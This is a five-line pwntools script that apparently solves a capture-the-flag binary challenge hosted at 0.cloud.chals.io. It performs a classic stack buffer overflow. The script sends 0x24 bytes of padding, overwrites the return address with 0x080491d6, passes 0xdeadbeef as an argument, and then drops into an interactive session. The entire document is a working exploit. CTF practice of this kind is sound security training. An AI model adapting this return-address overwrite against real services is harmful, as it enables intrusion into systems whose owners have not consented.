from pwn import *
p = remote('0.cloud.chals.io', 28949)
payload = b'a'*(0x24)+p32(0x080491d6)+b'a'*4+p32(0xdeadbeef)
p.sendline(payload)
p.interactive()
